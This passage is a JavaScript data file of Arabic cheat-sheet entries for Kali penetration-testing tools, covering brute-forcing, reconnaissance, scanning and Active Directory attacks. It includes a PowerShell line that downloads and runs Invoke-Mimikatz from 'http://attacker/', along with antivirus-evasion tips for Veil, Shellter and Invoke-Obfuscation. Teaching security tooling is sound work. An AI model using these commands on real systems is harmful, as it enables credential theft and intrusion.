// ============================================================
// KALI ACADEMY - COMMANDS DATABASE PART 15
// 80 NEW UNIQUE COMMANDS - IDs 1431-1510
// ============================================================
window.CMD_PART15 = [
  {
    id: 1431,
    name: 'crunch',
    cat: 'password',
    level: 'beginner',
    syntax: 'crunch <min> <max> [charset] [options]',
    short: 'توليد قوائم كلمات مرور مخصصة',
    desc: 'أداة لتوليد قوائم كلمات مرور بناءً على معايير محددة مثل الطول ومجموعة الأحرف والأنماط.',
    options: [
      { flag: '-o <file>', desc: 'حفظ القائمة في ملف' },
      { flag: '-t <pattern>', desc: 'نمط محدد (@ = حروف صغيرة, % = أرقام, ^ = رموز)' },
      { flag: '-b <size>', desc: 'تقسيم الإخراج إلى ملفات بحجم محدد' }
    ],
    examples: [
      { cmd: 'crunch 8 8 0123456789 -o pins.txt', desc: 'توليد كل الأرقام 8 خانات' },
      { cmd: 'crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt', desc: 'توليد كلمات 6-8 خانات' },
      { cmd: 'crunch 10 10 -t name@@@###', desc: 'نمط محدد' }
    ],
    tips: 'استخدم crunch مع pipe مباشرة إلى hydra بدلاً من حفظ الملف.',
    related: ['john', 'hashcat', 'cewl']
  },
  {
    id: 1432,
    name: 'medusa',
    cat: 'password',
    level: 'intermediate',
    syntax: 'medusa -h <host> -u <user> -P <wordlist> -M <module>',
    short: 'هجوم brute force متوازي سريع',
    desc: 'أداة brute force متوازية تدعم بروتوكولات متعددة مثل SSH, FTP, HTTP, Telnet وغيرها.',
    options: [
      { flag: '-h <host>', desc: 'الهدف' },
      { flag: '-u <user>', desc: 'اسم المستخدم' },
      { flag: '-P <file>', desc: 'قائمة كلمات المرور' },
      { flag: '-M <module>', desc: 'البروتوكول (ssh, ftp, http)' },
      { flag: '-t <threads>', desc: 'عدد الخيوط' }
    ],
    examples: [
      { cmd: 'medusa -h 192.168.1.100 -u admin -P rockyou.txt -M ssh', desc: 'هجوم SSH' },
      { cmd: 'medusa -h 192.168.1.100 -u root -P passwords.txt -M ftp', desc: 'هجوم FTP' }
    ],
    tips: 'medusa غالباً أسرع من hydra في البروتوكولات التي تدعم التوازي.',
    related: ['hydra', 'ncrack', 'patator']
  },
  {
    id: 1433,
    name: 'ncrack',
    cat: 'password',
    level: 'intermediate',
    syntax: 'ncrack [options] <target>',
    short: 'أداة كسر مصادقة شبكية سريعة من Nmap',
    desc: 'أداة من مجموعة Nmap لكسر المصادقة على الخدمات الشبكية بسرعة عالية.',
    options: [
      { flag: '-U <file>', desc: 'قائمة المستخدمين' },
      { flag: '-P <file>', desc: 'قائمة كلمات المرور' },
      { flag: '-p <port>', desc: 'المنفذ المستهدف' },
      { flag: '-v', desc: 'وضع verbose' }
    ],
    examples: [
      { cmd: 'ncrack -p 22 --user root -P passwords.txt 192.168.1.100', desc: 'هجوم SSH' },
      { cmd: 'ncrack -p 3389 -U users.txt -P pass.txt 192.168.1.100', desc: 'هجوم RDP' }
    ],
    tips: 'ncrack من أقوى الأدوات لكسر خدمة RDP.',
    related: ['hydra', 'medusa', 'crowbar']
  },
  {
    id: 1434,
    name: 'crowbar',
    cat: 'password',
    level: 'intermediate',
    syntax: 'crowbar -b <service> -s <target> -u <user> -c <pass>',
    short: 'هجوم brute force لـ RDP و VNC و SSH بمفاتيح',
    desc: 'متخصص في كسر RDP وVNC وSSH باستخدام مفاتيح بدلاً من كلمات المرور فقط.',
    options: [
      { flag: '-b <service>', desc: 'الخدمة (rdp, vnc, sshkey)' },
      { flag: '-s <target>', desc: 'الهدف' },
      { flag: '-u <user>', desc: 'اسم المستخدم' },
      { flag: '-c <pass>', desc: 'كلمة المرور أو ملف' }
    ],
    examples: [
      { cmd: 'crowbar -b rdp -s 192.168.1.100 -u administrator -C passwords.txt', desc: 'هجوم RDP' },
      { cmd: 'crowbar -b sshkey -s 192.168.1.100 -u root -k /root/.ssh/', desc: 'هجوم SSH بمفاتيح' }
    ],
    tips: 'crowbar هو الأمثل لاختبار RDP حيث hydra أقل كفاءة.',
    related: ['ncrack', 'hydra', 'medusa']
  },
  {
    id: 1435,
    name: 'patator',
    cat: 'password',
    level: 'advanced',
    syntax: 'patator <module> [options]',
    short: 'أداة brute force متعددة الأغراض',
    desc: 'أداة brute force متعددة الاستخدامات تدعم طيفاً واسعاً من البروتوكولات والخدمات.',
    options: [
      { flag: 'ssh_login', desc: 'كسر SSH' },
      { flag: 'ftp_login', desc: 'كسر FTP' },
      { flag: 'http_fuzz', desc: 'fuzzing HTTP' },
      { flag: 'host=', desc: 'الهدف' },
      { flag: 'user=', desc: 'اسم المستخدم' }
    ],
    examples: [
      { cmd: 'patator ssh_login host=192.168.1.100 user=root password=FILE0 0=rockyou.txt', desc: 'هجوم SSH' },
      { cmd: 'patator http_fuzz url=http://target.com/login method=POST body="user=admin&pass=FILE0" 0=passwords.txt', desc: 'هجوم HTTP Login' }
    ],
    tips: 'patator أكثر مرونة من hydra في التخصيص.',
    related: ['hydra', 'medusa', 'burpsuite']
  },
  {
    id: 1436,
    name: 'hashid',
    cat: 'password',
    level: 'beginner',
    syntax: 'hashid <hash>',
    short: 'تحديد نوع الهاش',
    desc: 'يحدد نوع الهاش تلقائياً ليساعدك في معرفة الأداة المناسبة لكسره.',
    options: [
      { flag: '-m', desc: 'عرض رقم mode لـ Hashcat' },
      { flag: '-j', desc: 'عرض format لـ John' },
      { flag: '-e', desc: 'عرض معلومات موسعة' }
    ],
    examples: [
      { cmd: 'hashid "5f4dcc3b5aa765d61d8327deb882cf99"', desc: 'تحديد نوع هاش' },
      { cmd: 'hashid -m "5f4dcc3b5aa765d61d8327deb882cf99"', desc: 'مع رقم Hashcat mode' }
    ],
    tips: 'استخدم hashid دائماً قبل hashcat لمعرفة الـ mode الصحيح.',
    related: ['hash-identifier', 'hashcat', 'john']
  },
  {
    id: 1437,
    name: 'hash-identifier',
    cat: 'password',
    level: 'beginner',
    syntax: 'hash-identifier',
    short: 'تحديد نوع الهاش بشكل تفاعلي',
    desc: 'أداة تفاعلية بسيطة لتحديد نوع الهاش عبر إدخاله مباشرة.',
    options: [],
    examples: [
      { cmd: 'hash-identifier', desc: 'تشغيل تفاعلي' }
    ],
    tips: 'بديل سهل لـ hashid خاصة للمبتدئين.',
    related: ['hashid', 'hashcat', 'john']
  },
  {
    id: 1438,
    name: 'ophcrack',
    cat: 'password',
    level: 'intermediate',
    syntax: 'ophcrack [options]',
    short: 'كسر هاشات Windows LM/NTLM بـ Rainbow Tables',
    desc: 'أداة لكسر كلمات مرور Windows باستخدام Rainbow Tables، فعالة جداً مع هاشات LM.',
    options: [
      { flag: '-t <table>', desc: 'مسار Rainbow Tables' },
      { flag: '-f <hashfile>', desc: 'ملف الهاشات' },
      { flag: '-g', desc: 'وضع الواجهة الرسومية' }
    ],
    examples: [
      { cmd: 'ophcrack -t /path/to/tables -f hashes.txt', desc: 'كسر الهاشات' }
    ],
    tips: 'حمّل rainbow tables المجانية من ophcrack.sourceforge.io.',
    related: ['hashcat', 'john', 'mimikatz']
  },
  {
    id: 1439,
    name: 'pwdump',
    cat: 'password',
    level: 'advanced',
    syntax: 'pwdump <options>',
    short: 'استخراج هاشات كلمات مرور Windows من SAM',
    desc: 'أداة لاستخراج هاشات كلمات المرور من قاعدة بيانات SAM على Windows.',
    options: [],
    examples: [
      { cmd: 'pwdump7.exe', desc: 'استخراج الهاشات من Windows' }
    ],
    tips: 'تحتاج لصلاحيات SYSTEM أو Administrator لتشغيل pwdump.',
    related: ['mimikatz', 'hashcat', 'secretsdump']
  },
  {
    id: 1440,
    name: 'sherlock',
    cat: 'recon',
    level: 'beginner',
    syntax: 'sherlock <username>',
    short: 'البحث عن اسم مستخدم عبر منصات الإنترنت',
    desc: 'يبحث عن اسم مستخدم محدد عبر مئات المنصات والمواقع الاجتماعية.',
    options: [
      { flag: '--output <file>', desc: 'حفظ النتائج في ملف' },
      { flag: '--timeout <sec>', desc: 'وقت الانتظار لكل موقع' },
      { flag: '--print-all', desc: 'طباعة جميع النتائج' }
    ],
    examples: [
      { cmd: 'sherlock john_doe', desc: 'بحث عن اسم مستخدم' },
      { cmd: 'sherlock john_doe --output results.txt', desc: 'حفظ النتائج' }
    ],
    tips: 'sherlock يدعم البحث في أكثر من 300 منصة.',
    related: ['theHarvester', 'osintgram', 'social-analyzer']
  },
  {
    id: 1441,
    name: 'theHarvester',
    cat: 'recon',
    level: 'beginner',
    syntax: 'theHarvester -d <domain> -b <sources>',
    short: 'جمع معلومات OSINT للنطاقات والبريد الإلكتروني',
    desc: 'أداة OSINT لجمع عناوين البريد الإلكتروني والنطاقات الفرعية وعناوين IP من مصادر متعددة.',
    options: [
      { flag: '-d <domain>', desc: 'النطاق المستهدف' },
      { flag: '-b <sources>', desc: 'مصادر البحث (google, bing, shodan, all)' },
      { flag: '-l <limit>', desc: 'الحد الأقصى للنتائج' }
    ],
    examples: [
      { cmd: 'theHarvester -d example.com -b google', desc: 'جمع معلومات من Google' },
      { cmd: 'theHarvester -d example.com -b all', desc: 'جمع من كل المصادر' }
    ],
    tips: 'الحصول على API keys يزيد من فاعلية theHarvester كثيراً.',
    related: ['maltego', 'recon-ng', 'amass']
  },
  {
    id: 1442,
    name: 'photon',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'photon -u <url> [options]',
    short: 'زاحف ويب سريع لجمع معلومات OSINT',
    desc: 'زاحف ويب سريع يجمع الروابط والأسرار والبيانات الوصفية من مواقع الويب.',
    options: [
      { flag: '-u <url>', desc: 'الرابط المستهدف' },
      { flag: '-l <level>', desc: 'عمق الزحف' },
      { flag: '-t <threads>', desc: 'عدد الخيوط' },
      { flag: '-o <dir>', desc: 'مجلد الإخراج' }
    ],
    examples: [
      { cmd: 'photon -u http://target.com', desc: 'زحف أساسي' },
      { cmd: 'photon -u http://target.com -l 3 -t 50', desc: 'زحف متعمق بخيوط' }
    ],
    tips: 'photon يستخرج مفاتيح API وكلمات مرور مخفية في الكود.',
    related: ['theHarvester', 'scrapy', 'gospider']
  },
  {
    id: 1443,
    name: 'gospider',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'gospider -s <url> [options]',
    short: 'زاحف ويب سريع بـ Go',
    desc: 'زاحف ويب عالي السرعة مكتوب بـ Go يجمع الروابط والأشكال.',
    options: [
      { flag: '-s <url>', desc: 'الرابط المستهدف' },
      { flag: '-d <depth>', desc: 'عمق الزحف' },
      { flag: '-c <threads>', desc: 'عدد الخيوط' },
      { flag: '-o <dir>', desc: 'مجلد الإخراج' }
    ],
    examples: [
      { cmd: 'gospider -s http://target.com -d 3', desc: 'زحف متعمق' },
      { cmd: 'gospider -s http://target.com -c 20 -d 5', desc: 'زحف سريع ومتعمق' }
    ],
    tips: 'اجمع النتائج مع katana للحصول على تغطية شاملة.',
    related: ['photon', 'katana', 'hakrawler']
  },
  {
    id: 1444,
    name: 'katana',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'katana -u <url> [options]',
    short: 'زاحف ويب من ProjectDiscovery',
    desc: 'زاحف ويب سريع وقابل للتخصيص من ProjectDiscovery يدعم JavaScript crawling.',
    options: [
      { flag: '-u <url>', desc: 'الهدف' },
      { flag: '-d <depth>', desc: 'عمق الزحف' },
      { flag: '-jc', desc: 'JavaScript crawling' }
    ],
    examples: [
      { cmd: 'katana -u http://target.com', desc: 'زحف أساسي' },
      { cmd: 'katana -u http://target.com -jc -d 5', desc: 'زحف مع JavaScript' }
    ],
    tips: 'katana -jc يكشف endpoints مخفية في JavaScript.',
    related: ['gospider', 'photon', 'hakrawler']
  },
  {
    id: 1445,
    name: 'hakrawler',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'cat urls.txt | hakrawler',
    short: 'زحف ويب بسيط وسريع عبر stdin',
    desc: 'زاحف ويب بسيط يقبل الروابط عبر stdin ويُخرج كل الروابط المكتشفة.',
    options: [
      { flag: '-d <depth>', desc: 'عمق الزحف' },
      { flag: '-plain', desc: 'إخراج نص فقط' },
      { flag: '-subs', desc: 'تضمين النطاقات الفرعية' }
    ],
    examples: [
      { cmd: 'echo "http://target.com" | hakrawler', desc: 'زحف رابط واحد' },
      { cmd: 'cat urls.txt | hakrawler -d 3', desc: 'زحف قائمة روابط' }
    ],
    tips: 'ادمج hakrawler مع gau للحصول على URLs تاريخية.',
    related: ['gospider', 'katana', 'gau']
  },
  {
    id: 1446,
    name: 'gau',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'gau [options] <domain>',
    short: 'جمع URLs تاريخية من الأرشيفات',
    desc: 'يجمع URLs تاريخية من Wayback Machine و Common Crawl وغيرها.',
    options: [
      { flag: '--threads <n>', desc: 'عدد الخيوط' },
      { flag: '--subs', desc: 'تضمين النطاقات الفرعية' },
      { flag: '--o <file>', desc: 'ملف الإخراج' }
    ],
    examples: [
      { cmd: 'gau example.com', desc: 'جمع URLs تاريخية' },
      { cmd: 'gau --subs example.com | grep "api"', desc: 'إيجاد API endpoints' }
    ],
    tips: 'gau قد يكشف عن endpoints قديمة لا تزال تعمل.',
    related: ['hakrawler', 'waybackurls', 'gospider']
  },
  {
    id: 1447,
    name: 'waybackurls',
    cat: 'recon',
    level: 'beginner',
    syntax: 'waybackurls <domain>',
    short: 'جمع URLs من Wayback Machine',
    desc: 'يسترجع كل URLs مؤرشفة لنطاق معين من Wayback Machine.',
    options: [],
    examples: [
      { cmd: 'waybackurls example.com', desc: 'جمع URLs مؤرشفة' },
      { cmd: 'waybackurls example.com | grep "admin"', desc: 'إيجاد صفحات الإدارة' }
    ],
    tips: 'ابحث في URLs التاريخية عن ملفات backup وصفحات admin قديمة.',
    related: ['gau', 'hakrawler', 'gospider']
  },
  {
    id: 1448,
    name: 'arjun',
    cat: 'web',
    level: 'intermediate',
    syntax: 'arjun -u <url>',
    short: 'اكتشاف معاملات HTTP المخفية',
    desc: 'أداة لاكتشاف المعاملات المخفية في طلبات HTTP GET وPOST.',
    options: [
      { flag: '-u <url>', desc: 'الرابط المستهدف' },
      { flag: '-m <method>', desc: 'الطريقة (GET, POST, JSON)' },
      { flag: '--stable', desc: 'وضع مستقر أبطأ لكن أدق' }
    ],
    examples: [
      { cmd: 'arjun -u http://target.com/api', desc: 'اكتشاف المعاملات' },
      { cmd: 'arjun -u http://target.com/api -m JSON', desc: 'فحص JSON API' }
    ],
    tips: 'arjun يكشف عن معاملات debug وadmin مخفية.',
    related: ['ffuf', 'paramspider', 'burpsuite']
  },
  {
    id: 1449,
    name: 'paramspider',
    cat: 'web',
    level: 'intermediate',
    syntax: 'paramspider -d <domain>',
    short: 'استخراج معاملات URL من الأرشيفات',
    desc: 'يستخرج معاملات URL من wayback machine للعثور على نقاط حقن محتملة.',
    options: [
      { flag: '-d <domain>', desc: 'النطاق المستهدف' },
      { flag: '-o <file>', desc: 'ملف الإخراج' },
      { flag: '-l <level>', desc: 'مستوى التصفية' }
    ],
    examples: [
      { cmd: 'paramspider -d example.com', desc: 'استخراج المعاملات' },
      { cmd: 'paramspider -d example.com -o params.txt', desc: 'حفظ النتائج' }
    ],
    tips: 'ادمج paramspider مع dalfox لفحص XSS تلقائياً.',
    related: ['arjun', 'gau', 'dalfox']
  },
  {
    id: 1450,
    name: 'httpx',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'httpx [options]',
    short: 'فحص خوادم HTTP بشكل سريع وجماعي',
    desc: 'أداة ProjectDiscovery لفحص الروابط وجمع معلومات HTTP مثل Status Code والتقنيات المستخدمة.',
    options: [
      { flag: '-l <file>', desc: 'قائمة الأهداف' },
      { flag: '-status-code', desc: 'عرض كود HTTP' },
      { flag: '-title', desc: 'عرض عنوان الصفحة' },
      { flag: '-tech-detect', desc: 'اكتشاف التقنيات' },
      { flag: '-mc <codes>', desc: 'فلترة حسب الكود' }
    ],
    examples: [
      { cmd: 'echo "http://target.com" | httpx', desc: 'فحص رابط واحد' },
      { cmd: 'cat hosts.txt | httpx -status-code -title -tech-detect', desc: 'فحص قائمة وجمع معلومات' }
    ],
    tips: 'httpx مثالي بعد subfinder لفلترة النطاقات الفرعية النشطة.',
    related: ['subfinder', 'nuclei', 'whatweb']
  },
  {
    id: 1451,
    name: 'dnsx',
    cat: 'recon',
    level: 'intermediate',
    syntax: 'dnsx [options]',
    short: 'حل DNS بشكل سريع وجماعي',
    desc: 'أداة لحل DNS بشكل سريع لقوائم النطاقات والتحقق من وجودها.',
    options: [
      { flag: '-l <file>', desc: 'قائمة النطاقات' },
      { flag: '-a', desc: 'الاستعلام عن سجلات A' },
      { flag: '-cname', desc: 'الاستعلام عن CNAME' },
      { flag: '-resp', desc: 'عرض استجابة DNS' }
    ],
    examples: [
      { cmd: 'cat subdomains.txt | dnsx', desc: 'حل DNS لقائمة نطاقات' },
      { cmd: 'dnsx -l hosts.txt -a -resp', desc: 'حل مع إظهار الاستجابة' }
    ],
    tips: 'ادمج subfinder مع dnsx وhttpx للاستطلاع الكامل.',
    related: ['httpx', 'subfinder', 'dnsenum']
  },
  {
    id: 1452,
    name: 'naabu',
    cat: 'network',
    level: 'intermediate',
    syntax: 'naabu -host <target> [options]',
    short: 'ماسح منافذ سريع من ProjectDiscovery',
    desc: 'ماسح منافذ سريع من ProjectDiscovery يدعم SYN scan وTCP scan.',
    options: [
      { flag: '-host <target>', desc: 'الهدف' },
      { flag: '-p <ports>', desc: 'المنافذ المحددة' },
      { flag: '-top-ports <n>', desc: 'أعلى n منفذ شائع' },
      { flag: '-o <file>', desc: 'ملف الإخراج' }
    ],
    examples: [
      { cmd: 'naabu -host example.com -top-ports 1000', desc: 'مسح المنافذ الشائعة' },
      { cmd: 'naabu -host 192.168.1.0/24 -p 80,443,8080', desc: 'مسح منافذ محددة' }
    ],
    tips: 'ادمج naabu مع httpx للمسح السريع والكشف عن خدمات الويب.',
    related: ['nmap', 'masscan', 'rustscan']
  },
  {
    id: 1453,
    name: 'rustscan',
    cat: 'network',
    level: 'intermediate',
    syntax: 'rustscan -a <target> [options]',
    short: 'ماسح منافذ فائق السرعة بـ Rust',
    desc: 'ماسح منافذ سريع جداً مكتوب بـ Rust يتكامل مع nmap للحصول على نتائج تفصيلية.',
    options: [
      { flag: '-a <target>', desc: 'الهدف أو قائمة أهداف' },
      { flag: '-p <ports>', desc: 'المنافذ المحددة' },
      { flag: '-t <timeout>', desc: 'وقت الانتظار' },
      { flag: '-- <nmap flags>', desc: 'تمرير خيارات إلى nmap' }
    ],
    examples: [
      { cmd: 'rustscan -a 192.168.1.100', desc: 'مسح سريع' },
      { cmd: 'rustscan -a 192.168.1.100 -- -sV -sC', desc: 'مسح مع version detection' }
    ],
    tips: 'rustscan يمسح 65535 منفذ في أقل من 2 ثانية.',
    related: ['nmap', 'masscan', 'naabu']
  },
  {
    id: 1454,
    name: 'xray',
    cat: 'web',
    level: 'intermediate',
    syntax: 'xray webscan --basic-crawler <url>',
    short: 'ماسح ثغرات ويب تلقائي متقدم',
    desc: 'ماسح ثغرات ويب قوي يدعم تغطية واسعة من الثغرات مع passive وactive scanning.',
    options: [
      { flag: 'webscan', desc: 'وضع مسح الويب' },
      { flag: '--basic-crawler', desc: 'زحف وفحص تلقائي' },
      { flag: '--html-output', desc: 'تقرير HTML' }
    ],
    examples: [
      { cmd: 'xray webscan --basic-crawler http://target.com --html-output report.html', desc: 'مسح شامل مع تقرير' }
    ],
    tips: 'xray يدعم وضع passive مع Burp Suite proxy.',
    related: ['nuclei', 'nikto', 'zaproxy']
  },
  {
    id: 1455,
    name: 'jaeles',
    cat: 'web',
    level: 'advanced',
    syntax: 'jaeles scan -u <url> -s <signature>',
    short: 'ماسح ثغرات يعتمد على توقيعات قابلة للتخصيص',
    desc: 'إطار مسح قوي يدعم توقيعات YAML قابلة للتعديل لمسح ثغرات مخصصة.',
    options: [
      { flag: '-u <url>', desc: 'الهدف' },
      { flag: '-s <signature>', desc: 'مسار التوقيعات' },
      { flag: '-L <level>', desc: 'مستوى المسح' }
    ],
    examples: [
      { cmd: 'jaeles scan -u http://target.com -s /path/to/signatures/', desc: 'مسح بتوقيعات محددة' }
    ],
    tips: 'jaeles مشابه لـ nuclei لكنه أكثر مرونة في التخصيص.',
    related: ['nuclei', 'xray', 'nikto']
  },
  {
    id: 1456,
    name: 'openvas',
    cat: 'network',
    level: 'intermediate',
    syntax: 'gvm-start',
    short: 'ماسح ثغرات شبكية مفتوح المصدر',
    desc: 'OpenVAS/GVM هو أشهر ماسح ثغرات مفتوح المصدر يدعم فحصاً شاملاً للبنية التحتية.',
    options: [],
    examples: [
      { cmd: 'gvm-start', desc: 'بدء تشغيل OpenVAS' },
      { cmd: 'gvm-check-setup', desc: 'فحص الإعداد' }
    ],
    tips: 'OpenVAS يوفر واجهة ويب على https://127.0.0.1:9392',
    related: ['nessus', 'nuclei', 'nexpose']
  },
  {
    id: 1457,
    name: 'nessus',
    cat: 'network',
    level: 'intermediate',
    syntax: 'service nessusd start',
    short: 'ماسح ثغرات تجاري شهير',
    desc: 'Nessus هو أحد أشهر ماسحات الثغرات التجارية مع نسخة Essentials مجانية.',
    options: [],
    examples: [
      { cmd: 'service nessusd start', desc: 'تشغيل Nessus' },
      { cmd: 'https://localhost:8834', desc: 'فتح واجهة الويب' }
    ],
    tips: 'Nessus Essentials مجاني لـ 16 IP.',
    related: ['openvas', 'nuclei', 'qualys']
  },
  {
    id: 1458,
    name: 'responder',
    cat: 'network',
    level: 'advanced',
    syntax: 'responder -I <interface> [options]',
    short: 'اعتراض هاشات NTLM عبر NBT-NS وLLMNR',
    desc: 'يستغل بروتوكولات NBT-NS وLLMNR وMDNS لخداع أجهزة Windows وسرقة هاشات NTLMv2.',
    options: [
      { flag: '-I <interface>', desc: 'واجهة الشبكة' },
      { flag: '-w', desc: 'تفعيل WPAD server' },
      { flag: '-r', desc: 'الرد على NetBIOS Name Service' },
      { flag: '-v', desc: 'وضع verbose' }
    ],
    examples: [
      { cmd: 'responder -I eth0', desc: 'تشغيل أساسي' },
      { cmd: 'responder -I eth0 -wrdv', desc: 'وضع هجومي كامل' }
    ],
    tips: 'هاشات NTLMv2 المجمعة يمكن كسرها بـ hashcat -m 5600.',
    related: ['hashcat', 'ntlmrelayx', 'crackmapexec']
  },
  {
    id: 1459,
    name: 'ntlmrelayx',
    cat: 'network',
    level: 'advanced',
    syntax: 'ntlmrelayx.py -t <target>',
    short: 'هجوم NTLM Relay لتجاوز المصادقة',
    desc: 'ينفذ هجوم NTLM relay لإعادة توجيه هاشات NTLM المعترضة إلى أهداف أخرى للحصول على وصول.',
    options: [
      { flag: '-t <target>', desc: 'الهدف المستهدف بالـ relay' },
      { flag: '-smb2support', desc: 'دعم SMBv2' },
      { flag: '-i', desc: 'وضع interactive shell' },
      { flag: '--no-http-server', desc: 'تعطيل HTTP server' }
    ],
    examples: [
      { cmd: 'ntlmrelayx.py -t 192.168.1.100 -smb2support', desc: 'relay أساسي' },
      { cmd: 'ntlmrelayx.py -t smb://192.168.1.100 -i', desc: 'relay مع interactive shell' }
    ],
    tips: 'يعمل مع responder لأسلوب relay كامل.',
    related: ['responder', 'crackmapexec', 'impacket-secretsdump']
  },
  {
    id: 1460,
    name: 'kerberoasting',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'GetUserSPNs.py -dc-ip <dc> -request <domain>/<user>',
    short: 'استخراج وكسر تذاكر Kerberos TGS',
    desc: 'هجوم Kerberoasting يستخرج تذاكر TGS لحسابات خدمات AD ويكسر كلمات مرورها offline.',
    options: [],
    examples: [
      { cmd: 'GetUserSPNs.py -dc-ip 192.168.1.10 -request domain.local/user:pass', desc: 'استخراج تذاكر TGS' },
      { cmd: 'hashcat -m 13100 tgs_hashes.txt rockyou.txt', desc: 'كسر الهاشات' }
    ],
    tips: 'استهدف حسابات الخدمات بامتياز عالٍ مثل MSSQLSvc.',
    related: ['asreproasting', 'bloodhound', 'hashcat']
  },
  {
    id: 1461,
    name: 'asreproasting',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'GetNPUsers.py -dc-ip <dc> <domain>/',
    short: 'استخراج هاشات حسابات Kerberos بدون pre-authentication',
    desc: 'يستهدف حسابات AD المعطلة للـ Kerberos pre-authentication لاستخراج هاشات قابلة للكسر.',
    options: [],
    examples: [
      { cmd: 'GetNPUsers.py -dc-ip 192.168.1.10 domain.local/ -usersfile users.txt', desc: 'AS-REP Roasting' },
      { cmd: 'hashcat -m 18200 asrep_hashes.txt rockyou.txt', desc: 'كسر الهاشات' }
    ],
    tips: 'ابحث في BloodHound عن "Do Not Require Kerberos Preauthentication".',
    related: ['kerberoasting', 'bloodhound', 'hashcat']
  },
  {
    id: 1462,
    name: 'pass-the-hash',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'pth-winexe -U admin%hash //target cmd',
    short: 'المصادقة باستخدام NTLM hash مباشرة',
    desc: 'تقنية Pass-the-Hash تستخدم هاش NTLM مباشرة بدلاً من كلمة المرور للمصادقة.',
    options: [],
    examples: [
      { cmd: 'pth-winexe -U "admin%aad3b435b51404eeaad3b435b51404ee:ntlmhash" //192.168.1.100 cmd.exe', desc: 'تنفيذ أمر PtH' },
      { cmd: 'evil-winrm -i 192.168.1.100 -u admin -H ntlmhash', desc: 'WinRM PtH' }
    ],
    tips: 'تعمل Pass-the-Hash على LM/NTLM authentication وليس Kerberos.',
    related: ['impacket-psexec', 'evil-winrm', 'crackmapexec']
  },
  {
    id: 1463,
    name: 'golden-ticket',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'ticketer.py -domain <domain> -nthash <krbtgt_hash>',
    short: 'هجوم Golden Ticket لـ Kerberos',
    desc: 'يصنع تذكرة Kerberos TGT مزيفة باستخدام هاش KRBTGT لتصعيد الصلاحيات إلى Domain Admin.',
    options: [],
    examples: [
      { cmd: 'ticketer.py -domain domain.local -nthash krbtgt_hash -domain-sid S-1-5-21-xxx admin', desc: 'إنشاء Golden Ticket' }
    ],
    tips: 'Golden Ticket صالح لمدة 10 سنوات افتراضياً وصعب الكشف عنه.',
    related: ['bloodhound', 'mimikatz', 'impacket-secretsdump']
  },
  {
    id: 1464,
    name: 'invoke-mimikatz',
    cat: 'exploit',
    level: 'advanced',
    syntax: 'IEX(IWR http://host/Invoke-Mimikatz.ps1)',
    short: 'تشغيل Mimikatz عبر PowerShell بدون ملف',
    desc: 'تشغيل Mimikatz عبر PowerShell fileless لتجاوز أنظمة الحماية.',
    options: [],
    examples: [
      { cmd: 'IEX(New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1")', desc: 'تحميل وتشغيل مباشر' }
    ],
    tips: 'الأسلوب fileless يتجاوز بعض AV لكن AMSI قد يكشفه.',
    related: ['mimikatz', 'invoke-obfuscation', 'powershell']
  },
  {
    id: 1465,
    name: 'invoke-obfuscation',
    cat: 'antivirus',
    level: 'advanced',
    syntax: 'Invoke-Obfuscation',
    short: 'إخفاء وتشفير سكريبتات PowerShell',
    desc: 'أداة PowerShell لتشويه وتشفير السكريبتات لتجاوز الكشف عنها.',
    options: [],
    examples: [
      { cmd: 'Import-Module Invoke-Obfuscation; Invoke-Obfuscation', desc: 'تشغيل تفاعلي' }
    ],
    tips: 'ادمج مع AMSI bypass لتجاوز الدفاعات الحديثة.',
    related: ['invoke-mimikatz', 'amsi-bypass', 'powershell']
  },
  {
    id: 1466,
    name: 'veil',
    cat: 'antivirus',
    level: 'advanced',
    syntax: 'veil',
    short: 'توليد payloads تتجاوز الـ Antivirus',
    desc: 'إطار لتوليد payloads مشفرة ومشوهة لتجاوز أنظمة الحماية من الفيروسات.',
    options: [],
    examples: [
      { cmd: 'veil', desc: 'تشغيل واجهة Veil' }
    ],
    tips: 'Veil يدعم Evasion وOrdinance frameworks.',
    related: ['msfvenom', 'shellter', 'invoke-obfuscation']
  },
  {
    id: 1467,
    name: 'shellter',
    cat: 'antivirus',
    level: 'advanced',
    syntax: 'shellter',
    short: 'حقن shellcode في تطبيقات Windows PE',
    desc: 'يحقن shellcode في ملفات Windows PE الشرعية لتجاوز AV signatures.',
    options: [],
    examples: [
      { cmd: 'shellter', desc: 'تشغيل Shellter' }
    ],
    tips: 'استخدم ملفات PE شرعية وشائعة لأفضل نتائج التهرب.',
    related: ['veil', 'msfvenom', 'pe_injection']
  },
  {
    id: 1468,
    name: 'thor-lite',
    cat: 'antivirus',
    level: 'intermediate',
    syntax: 'thor-lite',
    short: 'فحص الأجهزة بحثاً عن IOCs',
    desc: 'أداة مجانية للكشف عن Indicators of Compromise على الأجهزة.',
    options: [],
    examples: [
      { cmd: 'thor-lite --quick', desc: 'فحص سريع' }
    ],
    tips: 'استخدم THOR Lite بعد الاختراق لفهم ما تركه المهاجمون.',
    related: ['volatility3', 'yara', 'clamav']
  },
  {
    id: 1469,
    name: 'yara',
    cat: 'forensics',
    level: 'advanced',
    syntax: 'yara [options] <rules> <target>',
    short: 'تحليل البرمجيات الخبيثة بالقواعد',
    desc: 'أداة لتصنيف ورصد البرمجيات الخبيثة باستخدام قواعد محددة للبحث عن أنماط.',
    options: [
      { flag: '-r', desc: 'بحث تكراري في المجلدات' },
      { flag: '-s', desc: 'عرض السلاسل المطابقة' },
      { flag: '-d', desc: 'تعريف متغير خارجي' }
    ],
    examples: [
      { cmd: 'yara malware.yar suspicious_file', desc: 'فحص ملف بقاعدة' },
      { cmd: 'yara -r rules/ /path/to/scan/', desc: 'فحص مجلد بقواعد متعددة' }
    ],
    tips: 'حمّل قواعد YARA الجاهزة من awesome-yara على GitHub.',
    related: ['clamav', 'thor-lite', 'volatility3']
  },
  {
    id: 1470,
    name: 'clamav',
    cat: 'antivirus',
    level: 'beginner',
    syntax: 'clamscan [options] <target>',
    short: 'مضاد فيروسات مفتوح المصدر',
